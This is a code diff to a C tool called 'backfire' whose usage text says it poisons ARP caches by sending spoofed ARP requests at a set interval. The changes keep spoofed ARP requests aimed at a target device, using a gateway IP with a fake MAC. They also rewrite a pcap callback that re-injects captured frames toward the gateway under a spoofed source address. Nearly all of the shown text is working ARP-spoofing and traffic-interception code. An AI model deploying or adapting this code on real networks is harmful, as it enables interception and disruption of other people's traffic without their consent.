@@ -126,12 +126,6 @@ int main(int argc, char const *argv[]) {
   int filterLength = strlen(gSpoofedMAC) + policiesLength + 150;
   char* gatekeeperFilter = malloc(filterLength * sizeof(char));
 
-  // (ether src not 3c:5a:b4:88:88:88) && (ether dst 3c:5a:b4:88:88:88) && (policies)
-  // strcpy(gatekeeperFilter, "ether src not ");
-  // strcat(gatekeeperFilter, gSpoofedMAC);
-  // strcat(gatekeeperFilter, " && ether dst ");
-  // strcat(gatekeeperFilter, gSpoofedMAC);
-
   // (ether src gTargetMAC) && (ether dst 3c:5a:b4:88:88:88) && (policies)
   strcpy(gatekeeperFilter, "ether src ");
   strcat(gatekeeperFilter, gTargetMAC);
@@ -290,7 +284,7 @@ Description: the backfire tool sends two arp requests every x milliseconds to po
 -- -- -- -- --                                                                              \n\
 Usage: backfire [option]                                                                    \n\
 Options:                                                                                    \n\
-  -a [<mac>/<ip>]:   gateway's IP and MAC address (eg. '-a 10:13:31:c3:b2:2/192.168.1.1')   \n\
+  -g [<mac>/<ip>]:   gateway's IP and MAC address (eg. '-g 10:13:31:c3:b2:2/192.168.1.1')   \n\
   -t [<mac>/<ip>]:   target device's IP and MAC address                                     \n\
   -x [milliseconds]: time intervel between every spoof attempt                              \n\
   -d [device] :      device from which capture and inject the traffic (eg. '-d en0')        \n\
@@ -442,13 +436,8 @@ void *pcapLoop(void *vargp) {
 void Poisoner(pcap_t* poisonHandler, int xms) {
   // Starting poisoning
   while (!gTerminate) {
-    // Poisoning gateway's cache
-    uint8_t* spoofedPkt = BuildEthArp(ARP_REQUEST, gTargetIP, gSpoofedMAC, gGatewayIP, NULL);
-    pcap_sendpacket(poisonHandler, spoofedPkt, ARP_SIZE); // ¯\_(ツ)_/¯
-    free(spoofedPkt);
-
     // Poisoning target's cache
-    spoofedPkt = BuildEthArp(ARP_REQUEST, gGatewayIP, gSpoofedMAC, gTargetIP, NULL);
+    uint8_t* spoofedPkt = BuildEthArp(ARP_REQUEST, gGatewayIP, gSpoofedMAC, gTargetIP, gTargetMAC);
     pcap_sendpacket(poisonHandler, spoofedPkt, ARP_SIZE);
     free(spoofedPkt);
 
@@ -471,21 +460,15 @@ void Gatekeeper(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes
   // Rebuilding Ethernet frame
   EthHeader* eth = (EthHeader*) bytes;
 
-  // Spoofing destination
+  // Delivering the packet to the gateway
   unsigned char dstMac[6];
-  if(memcmp(eth->srcAddr, gGatewayMAC, 6) == 0){
-    // Packet sent from gateway to device
-    stringToMAC(gTargetMAC, dstMac);
-  }
-  else {
-    // Packet sent from device to gateway
-    stringToMAC(gGatewayMAC, dstMac);
-  }
-
-  // Change source from gateway to dummy MAC
-  memcpy(eth->srcAddr, eth->dstAddr, 6);
-  // Change destination from dummy to device
+  stringToMAC(gGatewayMAC, dstMac);
   memcpy(eth->dstAddr, dstMac, 6);
+
+  // Dumb source to avoid the gateway caches <target mac, port(interface)>
+  unsigned char srcMac[6];
+  stringToMAC(gSpoofedMAC, srcMac);
+  memcpy(eth->srcAddr, srcMac, 6);
 
   // Injecting
   int res = pcap_sendpacket(gGatekeeperHandler, bytes, h->len);
